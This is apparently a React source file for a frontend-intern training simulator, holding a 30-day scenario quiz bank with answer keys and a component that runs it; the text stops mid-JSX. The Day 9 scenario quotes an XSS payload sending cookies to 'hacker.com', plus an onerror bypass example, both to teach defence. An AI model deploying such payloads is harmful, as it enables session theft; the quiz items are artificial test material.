import React, { useState, useEffect } from "react";

// Mock 30-Day Real-World Workplace Simulation Data
export const scenarioData = [
  {
    day: 1,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "You have joined the frontend team of an e-commerce company. The company is rebuilding its customer shopping website. Your mentor gives you the initial task: \"Start working on the new product-listing page. It must work on desktop, tablet and mobile.\" Before writing code, you need to decide how you will begin.",
    question: "How would you plan the responsive layout and architecture before writing initial code?",
    options: [
      {
        id: "a",
        text: "Plan a responsive mobile-first component grid layout and define breakpoint utility variables before writing styling.",
        isCorrect: true,
        feedbackTitle: "✓ EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "A responsive application should be planned for different screen sizes from the beginning. You understood the requirements before implementation.\n\nDay 2 situation: Your mentor gives you the approved desktop, tablet and mobile designs."
      },
      {
        id: "b",
        text: "Start writing desktop styles immediately with fixed pixel widths and adjust mobile later if bugs are reported.",
        isCorrect: false,
        feedbackTitle: "⚡ SUBOPTIMAL APPROACH",
        feedbackType: "warning",
        explanation: "Starting with fixed desktop widths often leads to hard-to-maintain CSS refactors later. Mobile-first or pre-planned breakpoints prevent responsive regression bugs."
      },
      {
        id: "c",
        text: "Copy & paste layout code from a non-responsive legacy project and tweak inline styles.",
        isCorrect: false,
        feedbackTitle: "❌ RISKY DECISION",
        feedbackType: "danger",
        explanation: "Copying non-responsive legacy code introduces technical debt and inline styles make global design system updates difficult."
      }
    ]
  },
  {
    day: 2,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "The product page is now being developed. The design contains: - Product image - Product name - Price - Rating - Add-to-cart button. You need to create the product card component.",
    question: "You need to create the product card component. What approach would you take?",
    options: [
      {
        id: "a",
        text: "Create a reusable product-card component that receives product information through props.",
        isCorrect: true,
        feedbackTitle: "✓ EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "Creating a reusable product-card component ensures consistency across all catalog pages, simplifies maintenance, and enables component testing.\n\nDay 3 situation: Your component is ready. Now you need to handle real-time shopping cart updates."
      },
      {
        id: "b",
        text: "Create the card directly inside the product page and reuse it later if needed.",
        isCorrect: false,
        feedbackTitle: "⚡ SUBOPTIMAL APPROACH",
        feedbackType: "warning",
        explanation: "Tightly coupling the card to a single page prevents reuse on search, recommendations, or checkout pages."
      },
      {
        id: "c",
        text: "Copy and paste the same card code wherever a product appears.",
        isCorrect: false,
        feedbackTitle: "❌ POOR PRACTICE",
        feedbackType: "danger",
        explanation: "Duplicating JSX code creates maintenance bottlenecks—updating a price tag would require changes in 20+ files."
      }
    ]
  },
  {
    day: 3,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "Users click \"Add to Cart\" on multiple products across different pages. The header cart badge, sliding side drawer, and main cart checkout summary all need to stay updated instantaneously without full page reloads.",
    question: "How would you structure the application state to handle shopping cart interactions?",
    options: [
      {
        id: "a",
        text: "Implement React Context API or Global State Management (Zustand/Redux) to maintain a single source of truth for cart items.",
        isCorrect: true,
        feedbackTitle: "✓ EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "Centralized state management prevents prop drilling and guarantees synchronized UI updates across disconnected header, side drawer, and checkout components.\n\nDay 4 situation: Your cart logic is solid! Next, the backend team deploys a new REST API endpoint."
      },
      {
        id: "b",
        text: "Pass cart state and update functions through 8 levels of parent and child component props manually.",
        isCorrect: false,
        feedbackTitle: "⚡ PROP DRILLING WARNING",
        feedbackType: "warning",
        explanation: "Deep prop drilling makes intermediate components unnecessary re-render targets and hard to refactor."
      },
      {
        id: "c",
        text: "Store cart items inside DOM data attributes (`data-cart-items`) and query the DOM with document.querySelector.",
        isCorrect: false,
        feedbackTitle: "❌ DOM MUTATION ANTI-PATTERN",
        feedbackType: "danger",
        explanation: "Direct DOM queries break React's declarative state model and risk state desynchronization."
      }
    ]
  },
  {
    day: 4,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "The backend product catalog REST API server occasionally experiences 2-second response latencies or temporary 503 gateway timeouts. Right now, interns report a completely blank white screen during data fetching.",
    question: "How will you handle loading state and network failure boundaries in the user interface?",
    options: [
      {
        id: "a",
        text: "Implement Skeleton loader components during pending fetches and Error Boundary retry cards with user-friendly error messages.",
        isCorrect: true,
        feedbackTitle: "✓ EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "Skeleton loaders reduce perceived user wait time, and fallback retry UI prevents app crashes on network flickers.\n\nDay 5 situation: Users love the smooth loading experience! Now search volume is surging."
      },
      {
        id: "b",
        text: "Keep the screen blank until data loads, and show a raw browser `alert()` modal if the API returns an error.",
        isCorrect: false,
        feedbackTitle: "⚡ POOR USER EXPERIENCE",
        feedbackType: "warning",
        explanation: "Blank screens confuse users into thinking the app is frozen, and native alert modals ruin user experience."
      },
      {
        id: "c",
        text: "Log the network error silently to console.error and leave the UI stuck in loading state forever.",
        isCorrect: false,
        feedbackTitle: "❌ UNHANDLED REJECTION",
        feedbackType: "danger",
        explanation: "Infinite loading states cause user frustration and high abandon rates."
      }
    ]
  },
  {
    day: 5,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "As users type into the search bar, an API request triggers on every single keydown event. Typing \"headphone\" fires 9 API requests in less than 1 second, overloading backend servers.",
    question: "How will you optimize search input requests to protect server resources?",
    options: [
      {
        id: "a",
        text: "Apply a 300ms Debounce custom hook on search input changes so requests fire only when typing pauses.",
        isCorrect: true,
        feedbackTitle: "✓ EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "Debouncing reduces network request volume by over 80% while retaining instant responsiveness.\n\nDay 6 situation: Search is optimized! Now catalog data is growing rapidly."
      },
      {
        id: "b",
        text: "Disable the live search feature entirely and force users to click a 'Submit Search' button.",
        isCorrect: false,
        feedbackTitle: "⚡ FEATURE REDUCTION",
        feedbackType: "warning",
        explanation: "Removing live search reduces user experience modern standards when simple debouncing easily solves the problem."
      },
      {
        id: "c",
        text: "Trigger requests on keydown, keyup, and focus events to capture all keyboard signals.",
        isCorrect: false,
        feedbackTitle: "❌ SERVER FLOODING",
        feedbackType: "danger",
        explanation: "Triplicating events amplifies server load and leads to rate limiting (429 errors)."
      }
    ]
  },
  {
    day: 6,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "The product database has scaled to 40,000 items. Fetching and rendering all products into the DOM at once causes low-end mobile browser tabs to crash due to DOM node overhead.",
    question: "Which data rendering technique should you implement for high-volume datasets?",
    options: [
      {
        id: "a",
        text: "Implement server-side pagination with query params (`page=1&limit=20`) combined with virtualized list rendering.",
        isCorrect: true,
        feedbackTitle: "✓ EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "Server pagination keeps payload size under 50KB, while windowing/virtualization renders only DOM nodes visible in viewport.\n\nDay 7 situation: Mobile performance is top-tier! Senior dev schedule code review."
      },
      {
        id: "b",
        text: "Fetch all 40,000 items in one giant JSON array and render all 40,000 HTML elements inside a CSS scroll view.",
        isCorrect: false,
        feedbackTitle: "❌ MEMORY CRASH RISK",
        feedbackType: "danger",
        explanation: "Rendering tens of thousands of active DOM nodes consumes over 1GB memory, freezing browser threads."
      },
      {
        id: "c",
        text: "Limit the entire database response to only 10 items total permanently.",
        isCorrect: false,
        feedbackTitle: "⚡ ARTIFICIAL LIMITATION",
        feedbackType: "warning",
        explanation: "Hardcoding a 10-item cap hides 99.9% of catalog products from customers."
      }
    ]
  },
  {
    day: 7,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "During code review of your Pull Request (PR), a Senior Frontend Engineer flags that your main component is 650 lines long with mixed concerns (API calls, UI templates, form validation logic).",
    question: "How should you refactor the Pull Request before merging to production?",
    options: [
      {
        id: "a",
        text: "Decompose into smaller single-responsibility components, extract API calls into custom hooks (`useProducts`), and add prop-types validation.",
        isCorrect: true,
        feedbackTitle: "✓ EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "Clean Architecture separates UI presentational layers from data hooks, making unit testing and maintainability effortless.\n\nDay 8 situation: Your refactored PR was approved and merged! Time for assets optimization."
      },
      {
        id: "b",
        text: "Comment on the PR arguing that a single file is easier to open in the code editor.",
        isCorrect: false,
        feedbackTitle: "⚡ TEAM CONFLICT",
        feedbackType: "warning",
        explanation: "Monolithic files increase git merge conflicts and violate modular design patterns."
      },
      {
        id: "c",
        text: "Bypass code review checks and force-merge the branch into main.",
        isCorrect: false,
        feedbackTitle: "❌ VIOLATION OF PROCESS",
        feedbackType: "danger",
        explanation: "Bypassing branch protection policies breaks team trust and bypasses automated CI pipelines."
      }
    ]
  },
  {
    day: 8,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "The product manager notes that page load speed score on Google Lighthouse dropped to 42 because product images are raw 4MB PNG files uploaded by vendors.",
    question: "What media optimization strategy should you deploy?",
    options: [
      {
        id: "a",
        text: "Serve WebP/AVIF image formats, dynamic srcset responsive sizes, and apply `loading=\"lazy\"` for off-screen images.",
        isCorrect: true,
        feedbackTitle: "✓ EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "Next-gen formats reduce image size by up to 80% without quality loss, boosting Lighthouse score to 95+.\n\nDay 9 situation: Speed is blazing! Now let's handle customer input security."
      },
      {
        id: "b",
        text: "Convert all images to inline Base64 data strings directly in JavaScript bundle files.",
        isCorrect: false,
        feedbackTitle: "❌ BUNDLE BLOAT",
        feedbackType: "danger",
        explanation: "Base64 increases binary string size by 33% and inflates JS bundle downloads, slowing initial page load."
      },
      {
        id: "c",
        text: "Resize all images to 100x100 pixels fixed size regardless of display resolution.",
        isCorrect: false,
        feedbackTitle: "⚡ BLURRY QUALITY",
        feedbackType: "warning",
        explanation: "Fixed low-res thumbnails look pixelated on Retina and desktop displays."
      }
    ]
  },
  {
    day: 9,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "Users can now write product reviews. Security audit team discovers that a malicious user posted `<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>` in a review text.",
    question: "How will you prevent Cross-Site Scripting (XSS) vulnerability when rendering user generated reviews?",
    options: [
      {
        id: "a",
        text: "Sanitize HTML using DOMPurify before rendering, avoid `dangerouslySetInnerHTML`, and set Content Security Policy headers.",
        isCorrect: true,
        feedbackTitle: "✓ EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "Proper string escaping and DOM sanitization prevents script injection attacks, protecting customer session tokens.\n\nDay 10 situation: Security patch deployed! Next up: Persistent user authentication."
      },
      {
        id: "b",
        text: "Render user reviews using `dangerouslySetInnerHTML={{ __html: reviewText }}` directly.",
        isCorrect: false,
        feedbackTitle: "❌ CRITICAL SECURITY HOLE",
        feedbackType: "danger",
        explanation: "Using raw HTML injection directly exposes all site visitors to session hijacking."
      },
      {
        id: "c",
        text: "Filter out only the exact word 'script' with string replace.",
        isCorrect: false,
        feedbackTitle: "⚡ BYPASSABLE FILTER",
        feedbackType: "warning",
        explanation: "Simple string matching is easily bypassed using tags like `<img src=x onerror=alert(1)>`."
      }
    ]
  },
  {
    day: 10,
    title: "Frontend Workplace Simulation",
    subtitle: "Scenario 1 of 1",
    situation: "When logged-in users refresh their browser window, they are unexpectedly redirected back to the login page because the auth state is wiped from memory.",
    question: "How should you store and maintain secure user authentication sessions across page refreshes?",
    options: [
      {
        id: "a",
        text: "Use HttpOnly SameSite Secure Cookies for JWT refresh tokens with an automated silent token refresh interceptor in Axios/Fetch.",
        isCorrect: true,
        feedbackTitle: "✓ EXCELLENT DECISION",
        feedbackType: "success",
        explanation: "HttpOnly cookies prevent JavaScript access (XSS protection), while silent refresh keeps user sessions seamless.\n\nDay 11 situation: Auth system is enterprise-grade! Next: CI/CD deployment checks."
      },
      {
        id: "b",
        text: "Store plain-text user passwords in browser `localStorage` and re-authenticate on every page load.",
        isCorrect: false,
        feedbackTitle: "❌ HIGH RISK SECURITY VULNERABILITY",
        feedbackType: "danger",
        explanation: "Storing plain text credentials in localStorage exposes user secrets to any third-party script or XSS attack."
      },
      {
        id: "c",
        text: "Keep session state solely in React component local state (`useState`).",
        isCorrect: false,
        feedbackTitle: "⚡ POOR PERSISTENCE",
        feedbackType: "warning",
        explanation: "React memory state resets on every hard browser refresh or tab navigation."
      }
    ]
  },
  // Generate remaining days 11 to 30 with high-quality real workplace simulations
  ...Array.from({ length: 20 }, (_, i) => {
    const dayNum = i + 11;
    const topics = [
      { t: "CI/CD Pipeline Automated Testing", desc: "Your commit triggered a build failure in GitHub Actions because ESLint found unused variables and failing snapshot tests.", q: "How do you handle automated CI pipeline failures before pushing to release branches?", best: "Run lint & unit test suites locally (`npm run test`), fix violations, and re-push clean commits.", alt1: "Disable linting rules in .eslintrc.js to force the build green.", alt2: "Delete failing unit test files." },
      { t: "Internationalization & Multi-language Support", desc: "The app is expanding to global markets. Hardcoded English string literals need to support French, Spanish, and German.", q: "What approach best supports dynamic localization without duplicating UI code?", best: "Implement react-i18next translation keys and lazy-load locale JSON dictionaries.", alt1: "Create separate HTML files for each spoken language.", alt2: "Use Google Translate iframe widget." },
      { t: "Dark Mode Theme Tokens", desc: "Product designers provided a dark theme specification with dynamic color variables.", q: "How should theme tokens be organized in the CSS design system?", best: "Define CSS custom properties (`:root` / `[data-theme='dark']`) for semantic colors like background and text colors.", alt1: "Add inline style conditions `style={{ color: isDark ? '#fff' : '#000' }}` on every single HTML tag.", alt2: "Duplicate all CSS stylesheets into dark-style.css." },
      { t: "Real-Time WebSocket Notifications", desc: "Order status updates need to push live alerts to customer screens when shipping status changes.", q: "How will you handle WebSocket connection reconnects and memory leaks?", best: "Establish WebSocket connection inside `useEffect`, handle automatic reconnection exponential backoff, and clean up listeners on unmount.", alt1: "Poll backend REST API every 100 milliseconds infinitely.", alt2: "Never close WebSocket connections when leaving the page." },
      { t: "Accessibility (a11y) Compliance", desc: "Screen reader users report inability to navigate modal dialogs or identify icon-only buttons.", q: "How will you elevate WCAG 2.1 AA accessibility standards?", best: "Add semantic ARIA labels (`aria-label`, `role=\"dialog\"`), focus trap within active modals, and ensure full keyboard TAB navigation.", alt1: "Add title tooltips on image elements.", alt2: "Ignore keyboard navigation as mouse users represent majority." },
      { t: "Form State & Validation Libraries", desc: "Complex checkout forms with address validation and credit card formatting cause lagging re-renders.", q: "Which form management pattern prevents frame drops during input typing?", best: "Use React Hook Form with un-controlled input refs and Schema validation (Zod/Yup).", alt1: "Store every character change in a single monolithic parent state causing 50 re-renders per second.", alt2: "Use unvalidated text inputs and rely on backend to reject bad data." },
      { t: "State Persistence & Offline Sync", desc: "Interns working on mobile networks lose draft form data when going through tunnels or offline zones.", q: "How can offline capability be implemented to preserve draft inputs?", best: "Register a Service Worker, sync offline form drafts using IndexedDB / Redux Persist, and retry submission on `online` window event.", alt1: "Display a full-screen offline error modal that clears all form inputs.", alt2: "Force mobile users to remain connected to Wi-Fi." },
      { t: "Third-Party Analytics & Performance", desc: "Marketing added 5 tracking pixels (Google Analytics, Mixpanel, Hotjar) which degraded core web vitals.", q: "How will you integrate third-party scripts without blocking critical rendering paths?", best: "Load non-critical scripts asynchronously (`async`/`defer`) or offload via Web Workers (Partytown).", alt1: "Place all tracking scripts synchronously in the HTML `<head>` tag before stylesheets.", alt2: "Remove all analytics scripts without telling marketing." },
      { t: "Micro-Frontend Modular Architecture", desc: "The payment team wants to deploy checkout updates independently from the main catalog app.", q: "What architectural pattern supports independent deployment pipelines?", best: "Adopt Webpack Module Federation or Vite Single-SPA micro-frontends with clear interface contracts.", alt1: "Embed the payment site inside an inline iframe.", alt2: "Keep all 50 developers committing directly to master branch without domain separation." },
      { t: "Zero-Downtime Feature Flags", desc: "A new AI recommendation widget needs to be rolled out safely to 10% of users first.", q: "How do you control feature availability in production environments?", best: "Wrap new components in a Remote Feature Flag evaluation hook with gradual canary percentage rollouts.", alt1: "Comment out code in production and deploy hotfix releases every hour.", alt2: "Deploy two completely different domains for users." },
      { t: "Design System Component Tokens", desc: "Designers changed the primary button radius from 4px to 12px across 200 screen layouts.", q: "How do central design tokens save refactoring time?", best: "Update centralized CSS token variable `--border-radius-primary` in design system config.", alt1: "Find and replace `border-radius: 4px` manually across 200 files.", alt2: "Override with `!important` in random CSS files." },
      { t: "Error Logging & Telemetry Sentry Integration", desc: "Uncaught JavaScript runtime errors are happening on specific mobile devices in production.", q: "How will developers capture and diagnose client-side exceptions remotely?", best: "Integrate Sentry / LogRocket SDK with source maps to track stack traces and browser metadata.", alt1: "Ask affected users to open Chrome Developer Tools on mobile and send screenshots.", alt2: "Suppress all window error events." },
      { t: "PWA Service Worker Caching Strategies", desc: "Static assets (fonts, icons, bundle files) are re-downloaded on every page load.", q: "Which Service Worker caching strategy optimizes static asset delivery?", best: "Implement Cache-First strategy for static immutable assets and Stale-While-Revalidate for API responses.", alt1: "Disable browser HTTP caching headers completely.", alt2: "Cache everything Network-Only without storage." },
      { t: "Cross-Browser CSS Compatibility", desc: "Safari iOS users report grid layouts collapsing because of modern flex gap syntax incompatibilities.", q: "How do you ensure cross-browser CSS fallback compatibility?", best: "Use PostCSS Autoprefixer with Browserslist config and target flexbox margin fallbacks.", alt1: "Display a message 'Please use Chrome on Desktop only'.", alt2: "Remove flexbox layouts." },
      { t: "API Rate Limiting & Exponential Backoff", desc: "High traffic spikes trigger 429 Too Many Requests errors from backend microservices.", q: "How should client network layers handle rate-limited API responses?", best: "Catch 429 status codes in HTTP client interceptor and retry with exponential backoff and jitter.", alt1: "Fire 10 rapid retry requests immediately upon error.", alt2: "Log out the user instantly." },
      { t: "DOM Memory Leak Prevention", desc: "Navigating between tabs causes browser memory usage to steadily climb from 100MB to 1.2GB.", q: "What is the common cause of React component memory leaks during page navigation?", best: "Uncleaned event listeners (`window.removeEventListener`), active setInterval timers, or uncancelled async fetch promises.", alt1: "React re-renders.", alt2: "Browser font loading." },
      { t: "GraphQL vs REST API Optimization", desc: "Catalog view needs only product title and price, but REST endpoint returns 80 unused fields.", q: "How can payload over-fetching be solved?", best: "Utilize GraphQL queries to request specific fields or request specialized lightweight REST view DTOs.", alt1: "Filter out JSON keys on client after downloading full 2MB payload.", alt2: "Delete backend database fields." },
      { t: "SEO Meta Tags & Dynamic Open Graph", desc: "Shared links on Twitter/LinkedIn show blank preview cards instead of product titles and images.", q: "How do you enable dynamic Open Graph meta tags for shared URLs?", best: "Implement Server-Side Rendering (SSR) or Static Site Generation (SSG) with dynamic `<meta property=\"og:image\">` tags.", alt1: "Client-side update `<title>` tag after 2 second delay.", alt2: "Ask users to download PDF catalog." },
      { t: "State Normalization for Complex Lists", desc: "Updating an item nested 4 levels deep in an array of categories causes full tree re-renders.", q: "How should nested application state be normalized?", best: "Normalize state by mapping items by unique IDs (`byId: {}, allIds: []`) for O(1) lookups and isolated updates.", alt1: "Mutate deeply nested state directly with `state.items[0].sub[2] = val`.", alt2: "Re-fetch complete backend database on every edit." },
      { t: "Final Production Deployment Readiness", desc: "The 30-day workplace internship concludes. Project needs final staging security audit & release candidate tag.", q: "What is the final checklist for production readiness?", best: "Execute clean production build, run automated end-to-end (E2E) tests, verify security headers, and verify zero console errors.", alt1: "Push code directly to production without testing.", alt2: "Turn off production monitoring." }
    ];

    const item = topics[i % topics.length];
    return {
      day: dayNum,
      title: "Frontend Workplace Simulation",
      subtitle: `Scenario 1 of 1`,
      situation: `Day ${dayNum}: ${item.t}. ${item.desc}`,
      question: item.q,
      options: [
        {
          id: "a",
          text: item.best,
          isCorrect: true,
          feedbackTitle: "✓ EXCELLENT DECISION",
          feedbackType: "success",
          explanation: `Great choice! Applying industry best practices for ${item.t.toLowerCase()} keeps application quality high.\n\nDay ${dayNum < 30 ? dayNum + 1 : 30} situation: Your team advances to the next operational phase.`
        },
        {
          id: "b",
          text: item.alt1,
          isCorrect: false,
          feedbackTitle: "⚡ SUBOPTIMAL APPROACH",
          feedbackType: "warning",
          explanation: `This approach introduces technical debt or temporary workarounds that don't address the root cause.`
        },
        {
          id: "c",
          text: item.alt2,
          isCorrect: false,
          feedbackTitle: "❌ POOR PRACTICE",
          feedbackType: "danger",
          explanation: `This action violates software engineering standards and risks system stability.`
        }
      ]
    };
  })
];

export default function DailyScenario({ onBackToDashboard, internId = 1 }) {
  // State for user progress and selected day
  const [selectedDay, setSelectedDay] = useState(1);
  const [selectedOptionId, setSelectedOptionId] = useState(null);
  
  // API State
  const [currentScenarioData, setCurrentScenarioData] = useState(null);
  const [decisionResult, setDecisionResult] = useState(null);
  const [loading, setLoading] = useState(true);

  const fetchSimulation = async () => {
    setLoading(true);
    try {
      const token = localStorage.getItem("token");
      const res = await fetch(`http://localhost:8000/simulation/intern/current`, {
        headers: { "Authorization": `Bearer ${token}` }
      });
      if (res.ok) {
        const data = await res.json();
        setCurrentScenarioData(data);
        setSelectedDay(data.day || 1);
        setDecisionResult(null);
        setSelectedOptionId(null);
      }
    } catch (e) {
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchSimulation();
  }, [internId]);

  const [isDemoBypass, setIsDemoBypass] = useState(false); // Default false: locked until 12 AM midnight, can preview via Demo button
  const [nowTime, setNowTime] = useState(new Date());

  // Track live countdown to midnight 12:00 AM
  useEffect(() => {
    const timer = setInterval(() => {
      setNowTime(new Date());
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Compute unlock status based on day or 12 AM midnight schedule
  // Day 1 is always unlocked. Next day unlocks only at 12:00 AM midnight unless Demo mode is clicked.
  const isDayUnlocked = (day) => {
    if (isDemoBypass) return true;
    if (day === 1) return true;
    return false; // Locked until 12:00 AM midnight
  };

  // Helper to format countdown until 12:00 AM Midnight
  const getTimeUntilMidnight = () => {
    const now = new Date();
    const midnight = new Date(now);
    midnight.setHours(24, 0, 0, 0); // Next 12:00 AM
    const diff = midnight - now;

    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
    const minutes = Math.floor((diff / (1000 * 60)) % 60);
    const seconds = Math.floor((diff / 1000) % 60);

    return `${hours.toString().padStart(2, '0')}h ${minutes.toString().padStart(2, '0')}m ${seconds.toString().padStart(2, '0')}s`;
  };

  const currentScenario = currentScenarioData;
  const isCompleted = !!decisionResult;
  const chosenOption = decisionResult;

  const handleSubmitDecision = async () => {
    if (!selectedOptionId) {
      alert("Please select an option before submitting your decision.");
      return;
    }
    
    try {
      const token = localStorage.getItem("token");
      const res = await fetch(`http://localhost:8000/simulation/decision`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${token}`
        },
        body: JSON.stringify({
          scenario_id: currentScenarioData.scenario_id,
          choice_id: selectedOptionId
        })
      });
      if (res.ok) {
        const result = await res.json();
        setDecisionResult({
          isCorrect: result.feedback_type === "success",
          feedbackType: result.feedback_type,
          feedbackTitle: result.feedback_type === "success" ? "✓ EXCELLENT DECISION" : "⚡ SUBOPTIMAL APPROACH",
          explanation: result.consequence + (result.feedback ? "\n\n" + result.feedback : ""),
          nextScenarioId: result.next_scenario
        });
      } else {
        alert("Error submitting decision");
      }
    } catch (e) {
      console.error(e);
    }
  };

  const handleSelectDay = (day) => {
    fetchSimulation(); // re-fetch to advance if completed
  };

  if (loading) {
    return <div style={{ textAlign: "center", padding: "40px" }}>Loading Simulation...</div>;
  }
  
  if (!currentScenarioData) {
    return <div style={{ textAlign: "center", padding: "40px" }}>No active simulation available.</div>;
  }

  return (
    <div style={{ padding: "0 4px", maxWidth: "1200px", margin: "0 auto" }}>
      {/* Top Bar Header */}
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "20px", flexWrap: "wrap", gap: "16px" }}>
        <div>
          <span style={{ fontSize: "12px", fontWeight: 700, color: "var(--text-muted)", textTransform: "uppercase", letterSpacing: "1px", display: "block" }}>
            DAY {selectedDay} OF 30
          </span>
          <h1 style={{ margin: "4px 0 0 0", fontSize: "24px", fontWeight: 800, color: "var(--text-dark)", letterSpacing: "-0.5px" }}>
            REAL-WORLD WORKPLACE SIMULATION
          </h1>
        </div>


      </div>


      {/* Main Workplace Simulation View Card */}
      {!isDayUnlocked(selectedDay) ? (
        /* Locked Day Card */
        <div className="card" style={{ textAlign: "center", padding: "60px 24px", backgroundColor: "var(--card-bg)", borderRadius: "16px", border: "1px solid var(--border-color)", boxShadow: "0 4px 12px rgba(0,0,0,0.03)" }}>
          <div style={{ width: "70px", height: "70px", borderRadius: "50%", backgroundColor: "var(--bg-blue-light)", color: "var(--primary-dark)", display: "flex", justifyContent: "center", alignItems: "center", fontSize: "32px", margin: "0 auto 20px auto" }}>
            🔒
          </div>
          <h2 style={{ fontSize: "22px", fontWeight: 700, color: "var(--text-dark)", margin: "0 0 10px 0" }}>
            Day {selectedDay} Scenario is Locked
          </h2>
          <p style={{ color: "var(--text-muted)", fontSize: "15px", maxWidth: "520px", margin: "0 auto 24px auto", lineHeight: "1.6" }}>
            In production, each daily scenario unlocks automatically at <b>12:00 AM Midnight</b>.
          </p>

          <div style={{ display: "inline-block", backgroundColor: "var(--bg-blue-light)", padding: "12px 24px", borderRadius: "10px", border: "1px solid var(--border-color)", marginBottom: "24px" }}>
            <span style={{ fontSize: "13px", color: "var(--primary-darker)", fontWeight: 600 }}>Next Day Unlocks in (12:00 AM): </span>
            <span style={{ fontFamily: "monospace", fontSize: "16px", fontWeight: 800, color: "var(--primary-dark)" }}>{getTimeUntilMidnight()}</span>
          </div>

          <div>
            <button
              onClick={() => setIsDemoBypass(true)}
              style={{ padding: "12px 24px", backgroundColor: "#5b5bd6", color: "#ffffff", border: "none", borderRadius: "8px", fontWeight: 700, fontSize: "14px", cursor: "pointer", boxShadow: "0 4px 10px rgba(91, 91, 214, 0.25)" }}
            >
              Preview Day {selectedDay} Scenario (Demo Mode) →
            </button>
          </div>
        </div>
      ) : (
        /* Unlocked Day Main Card matching attached images 2 & 3 */
        <div style={{ backgroundColor: "var(--card-bg)", borderRadius: "16px", border: "1px solid var(--border-color)", padding: "32px", boxShadow: "0 4px 15px rgba(0,0,0,0.03)" }}>
          {/* Demo Mode Notice Banner if previewing next day */}
          {isDemoBypass && selectedDay > 1 && (
            <div style={{ backgroundColor: "var(--bg-blue-light)", border: "1px solid var(--border-color)", borderRadius: "8px", padding: "10px 16px", marginBottom: "20px", fontSize: "13px", color: "var(--primary-darker)", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <span>ℹ️ <b>Demo Mode Active:</b> Previewing Day {selectedDay}. (In production, unlocks at 12:00 AM Midnight).</span>
              <button onClick={() => setIsDemoBypass(false)} style={{ background: "none", border: "none", color: "var(--primary-color)", fontWeight: 700, cursor: "pointer", textDecoration: "underline", fontSize: "12px" }}>
                Re-enable 12 AM Lock
              </button>
            </div>
          )}

          {/* Card Header */}
          <div style={{ marginBottom: "24px" }}>
            <h2 style={{ margin: "0 0 4px 0", fontSize: "20px", fontWeight: 700, color: "var(--text-dark)" }}>
              {currentScenario.title}
            </h2>
            <span style={{ fontSize: "14px", color: "var(--text-muted)", fontWeight: 500 }}>
              {currentScenario.subtitle}
            </span>
          </div>

          {/* SITUATION Callout Box - Styled exactly as Image 2 & 3 */}
          <div
            style={{
              backgroundColor: "var(--bg-blue-light)",
              borderLeft: "4px solid var(--primary-color)",
              borderRadius: "0 12px 12px 0",
              padding: "20px 24px",
              marginBottom: "28px"
            }}
          >
            <h4 style={{ margin: "0 0 10px 0", fontSize: "13px", fontWeight: 800, color: "var(--primary-color)", textTransform: "uppercase", letterSpacing: "1px" }}>
              SITUATION
            </h4>
            <p style={{ margin: 0, fontSize: "15px", color: "var(--text-color)", lineHeight: "1.65", fontWeight: 400 }}>
              {currentScenario.situation}
            </p>
          </div>

          {/* If NOT completed yet: Show question choices and submit button */}
          {!isCompleted ? (
            <div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "var(--text-dark)", marginBottom: "20px", lineHeight: "1.5" }}>
                {currentScenario.question}
              </h3>

              {/* Options List */}
              <div style={{ display: "flex", flexDirection: "column", gap: "14px", marginBottom: "28px" }}>
                {currentScenario.choices && currentScenario.choices.map((option) => {
                  const isSelected = selectedOptionId === option.id;

                  return (
                    <div
                      key={option.id}
                      onClick={() => setSelectedOptionId(option.id)}
                      style={{
                        display: "flex",
                        alignItems: "flex-start",
                        gap: "14px",
                        padding: "16px 20px",
                        borderRadius: "12px",
                        border: isSelected ? "2px solid var(--primary-color)" : "1px solid var(--border-color)",
                        backgroundColor: isSelected ? "var(--bg-blue-light)" : "var(--card-bg)",
                        cursor: "pointer",
                        transition: "all 0.2s ease",
                        boxShadow: isSelected ? "0 2px 8px rgba(99, 102, 241, 0.12)" : "none"
                      }}
                    >
                      <input
                        type="radio"
                        name={`scenario-day-${selectedDay}`}
                        checked={isSelected}
                        onChange={() => setSelectedOptionId(option.id)}
                        style={{ marginTop: "3px", accentColor: "var(--primary-color)", width: "18px", height: "18px", cursor: "pointer" }}
                      />
                      <span style={{ fontSize: "15px", color: isSelected ? "var(--primary-darker)" : "var(--text-color)", fontWeight: isSelected ? 600 : 400, lineHeight: "1.5", flex: 1 }}>
                        {option.text}
                      </span>
                    </div>
                  );
                })}
              </div>

              {/* Submit Button - Styled like Image 2 */}
              <button
                onClick={handleSubmitDecision}
                style={{
                  width: "100%",
                  padding: "14px 24px",
                  borderRadius: "10px",
                  backgroundColor: "#5b5bd6",
                  color: "#ffffff",
                  fontSize: "15px",
                  fontWeight: 700,
                  border: "none",
                  cursor: "pointer",
                  boxShadow: "0 4px 12px rgba(91, 91, 214, 0.25)",
                  transition: "background-color 0.2s ease"
                }}
                onMouseOver={(e) => (e.currentTarget.style.backgroundColor = "#4c4cb8")}
                onMouseOut={(e) => (e.currentTarget.style.backgroundColor = "#5b5bd6")}
              >
                Submit Decision
              </button>
            </div>
          ) : (
